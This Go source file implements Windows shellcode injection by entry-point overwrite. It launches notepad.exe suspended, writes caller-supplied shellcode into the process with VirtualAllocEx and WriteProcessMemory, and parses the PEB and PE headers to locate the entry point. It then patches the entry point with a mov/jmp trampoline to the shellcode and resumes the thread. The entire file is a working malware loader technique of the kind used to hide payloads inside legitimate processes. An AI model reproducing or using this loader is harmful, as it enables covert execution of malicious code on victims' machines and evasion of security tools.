package core

/*

References:
https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateProcess/main.go

*/

import (
  "encoding/binary"
  "fmt"
  "log"
  "syscall"
  "errors"
  "unsafe"

  // Sub Repositories
  "golang.org/x/sys/windows"
)

func CreateProcess(shellcode []byte) (error) {

  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
  ntdll := windows.NewLazySystemDLL("ntdll.dll")

  VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
  VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
  NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

  procInfo := &windows.ProcessInformation{}
  startupInfo := &windows.StartupInfo{
    Flags: windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
  }

  errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"), syscall.StringToUTF16Ptr(""), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
  if errCreateProcess != nil {
    return errCreateProcess
  }
	
  addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

  if addr == 0 {
    return errors.New("VirtualAllocEx failed and returned 0")
  }

  // Write shellcode into child process memory
  WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

  oldProtect := windows.PAGE_READWRITE
  VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

  type PEB struct {
    InheritedAddressSpace    byte    // BYTE	0
    ReadImageFileExecOptions byte    // BYTE	1
    BeingDebugged            byte    // BYTE	2
    reserved2                [1]byte // BYTE 3
    Mutant                 uintptr     // BYTE 4
    ImageBaseAddress       uintptr     // BYTE 8
    Ldr                    uintptr     // PPEB_LDR_DATA
    ProcessParameters      uintptr     // PRTL_USER_PROCESS_PARAMETERS
    reserved4              [3]uintptr  // PVOID
    AtlThunkSListPtr       uintptr     // PVOID
    reserved5              uintptr     // PVOID
    reserved6              uint32      // ULONG
    reserved7              uintptr     // PVOID
    reserved8              uint32      // ULONG
    AtlThunkSListPtr32     uint32      // ULONG
    reserved9              [45]uintptr // PVOID
    reserved10             [96]byte    // BYTE
    PostProcessInitRoutine uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
    reserved11             [128]byte   // BYTE
    reserved12             [1]uintptr  // PVOID
    SessionId              uint32      // ULONG
  }

  // https://github.com/elastic/go-windows/blob/master/ntdll.go#L77
  type PROCESS_BASIC_INFORMATION struct {
    reserved1                    uintptr    // PVOID
    PebBaseAddress               uintptr    // PPEB
    reserved2                    [2]uintptr // PVOID
    UniqueProcessId              uintptr    // ULONG_PTR
    InheritedFromUniqueProcessID uintptr    // PVOID
  }

  var processInformation PROCESS_BASIC_INFORMATION
  var returnLength uintptr
  ntStatus, _, _ := NtQueryInformationProcess.Call(uintptr(procInfo.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)

  if ntStatus != 0 {
    if ntStatus == 3221225476 {
      return errors.New("Error calling NtQueryInformationProcess: STATUS_INFO_LENGTH_MISMATCH") // 0xc0000004 (3221225476)
    }
    fmt.Println(fmt.Sprintf("[!] NtQueryInformationProcess returned NTSTATUS: %x(%d)", ntStatus, ntStatus))
    return errors.New("Error calling NtQueryInformationProcess")
  }

  // Read from PEB base address to populate the PEB structure
  ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")

  var peb PEB
  var readBytes int32

  ReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))

  // Read the child program's DOS header and validate it is a MZ executable
  type IMAGE_DOS_HEADER struct {
    Magic    uint16     // USHORT Magic number
    Cblp     uint16     // USHORT Bytes on last page of file
    Cp       uint16     // USHORT Pages in file
    Crlc     uint16     // USHORT Relocations
    Cparhdr  uint16     // USHORT Size of header in paragraphs
    MinAlloc uint16     // USHORT Minimum extra paragraphs needed
    MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
    SS       uint16     // USHORT Initial (relative) SS value
    SP       uint16     // USHORT Initial SP value
    CSum     uint16     // USHORT Checksum
    IP       uint16     // USHORT Initial IP value
    CS       uint16     // USHORT Initial (relative) CS value
    LfaRlc   uint16     // USHORT File address of relocation table
    Ovno     uint16     // USHORT Overlay number
    Res      [4]uint16  // USHORT Reserved words
    OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
    OEMInfo  uint16     // USHORT OEM information; e_oemid specific
    Res2     [10]uint16 // USHORT Reserved words
    LfaNew   int32      // LONG File address of new exe header
  }

  var dosHeader IMAGE_DOS_HEADER
  var readBytes2 int32

  ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))

  // 23117 is the LittleEndian unsigned base10 representation of MZ
  // 0x5a4d is the LittleEndian unsigned base16 represenation of MZ
  if dosHeader.Magic != 23117 {
    log.Fatal(fmt.Sprintf("[!]DOS image header magic string was not MZ"))
  }

  // Read the child process's PE header signature to validate it is a PE
  var Signature uint32
  var readBytes3 int32

  ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))

  // 17744 is Little Endian Unsigned 32-bit integer in decimal for PE (null terminated)
  // 0x4550 is Little Endian Unsigned 32-bit integer in hex for PE (null terminated)
  if Signature != 17744 {
    return errors.New("PE Signature string was not PE")
  }

  type IMAGE_FILE_HEADER struct {
    Machine              uint16
    NumberOfSections     uint16
    TimeDateStamp        uint32
    PointerToSymbolTable uint32
    NumberOfSymbols      uint32
    SizeOfOptionalHeader uint16
    Characteristics      uint16
  }

  var peHeader IMAGE_FILE_HEADER
  var readBytes4 int32

  ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))

  type IMAGE_OPTIONAL_HEADER64 struct {
    Magic                       uint16
    MajorLinkerVersion          byte
    MinorLinkerVersion          byte
    SizeOfCode                  uint32
    SizeOfInitializedData       uint32
    SizeOfUninitializedData     uint32
    AddressOfEntryPoint         uint32
    BaseOfCode                  uint32
    ImageBase                   uint64
    SectionAlignment            uint32
    FileAlignment               uint32
    MajorOperatingSystemVersion uint16
    MinorOperatingSystemVersion uint16
    MajorImageVersion           uint16
    MinorImageVersion           uint16
    MajorSubsystemVersion       uint16
    MinorSubsystemVersion       uint16
    Win32VersionValue           uint32
    SizeOfImage                 uint32
    SizeOfHeaders               uint32
    CheckSum                    uint32
    Subsystem                   uint16
    DllCharacteristics          uint16
    SizeOfStackReserve          uint64
    SizeOfStackCommit           uint64
    SizeOfHeapReserve           uint64
    SizeOfHeapCommit            uint64
    LoaderFlags                 uint32
    NumberOfRvaAndSizes         uint32
    DataDirectory               uintptr
  }

  type IMAGE_OPTIONAL_HEADER32 struct {
    Magic                       uint16
    MajorLinkerVersion          byte
    MinorLinkerVersion          byte
    SizeOfCode                  uint32
    SizeOfInitializedData       uint32
    SizeOfUninitializedData     uint32
    AddressOfEntryPoint         uint32
    BaseOfCode                  uint32
    BaseOfData                  uint32 // Different from 64 bit header
    ImageBase                   uint64
    SectionAlignment            uint32
    FileAlignment               uint32
    MajorOperatingSystemVersion uint16
    MinorOperatingSystemVersion uint16
    MajorImageVersion           uint16
    MinorImageVersion           uint16
    MajorSubsystemVersion       uint16
    MinorSubsystemVersion       uint16
    Win32VersionValue           uint32
    SizeOfImage                 uint32
    SizeOfHeaders               uint32
    CheckSum                    uint32
    Subsystem                   uint16
    DllCharacteristics          uint16
    SizeOfStackReserve          uint64
    SizeOfStackCommit           uint64
    SizeOfHeapReserve           uint64
    SizeOfHeapCommit            uint64
    LoaderFlags                 uint32
    NumberOfRvaAndSizes         uint32
    DataDirectory               uintptr
  }

  var optHeader64 IMAGE_OPTIONAL_HEADER64
  var optHeader32 IMAGE_OPTIONAL_HEADER32
  var readBytes5 int32

  if peHeader.Machine == 34404 { // 0x8664
    ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
  } else if peHeader.Machine == 332 { // 0x14c
    ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
  } else {
    return errors.New(fmt.Sprintf("Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
  }

  // Overwrite the value at AddressofEntryPoint field with trampoline to load the shellcode address in RAX/EAX and jump to it
  var ep uintptr
  if peHeader.Machine == 34404 { // 0x8664 x64
    ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
  } else if peHeader.Machine == 332 { // 0x14c x86
    ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
  } else {
    return errors.New(fmt.Sprintf("Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
  }

  var epBuffer []byte
  var shellcodeAddressBuffer []byte
  if peHeader.Machine == 34404 { // 0x8664 x64
    epBuffer = append(epBuffer, byte(0x48))
    epBuffer = append(epBuffer, byte(0xb8))
    shellcodeAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
    binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
    epBuffer = append(epBuffer, shellcodeAddressBuffer...)
  } else if peHeader.Machine == 332 { // 0x14c x86
    epBuffer = append(epBuffer, byte(0xb8))
    shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
    binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
    epBuffer = append(epBuffer, shellcodeAddressBuffer...)
  } else {
    return errors.New(fmt.Sprintf("Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
  }

  // 0xff ; 0xe0 = jmp [r|e]ax
  epBuffer = append(epBuffer, byte(0xff))
  epBuffer = append(epBuffer, byte(0xe0))

  WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))

  // Resume the child process
  _, errResumeThread := windows.ResumeThread(procInfo.Thread)
  if errResumeThread != nil {
    return errors.New(fmt.Sprintf("Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
  }

  // Close the handle to the child process
  errCloseProcHandle := windows.CloseHandle(procInfo.Process)
  if errCloseProcHandle != nil {
    return errors.New(fmt.Sprintf("Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()))
  }

  // Close the hand to the child process thread
  errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
  if errCloseThreadHandle != nil {
    return errors.New(fmt.Sprintf("Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
  }

  return nil
}


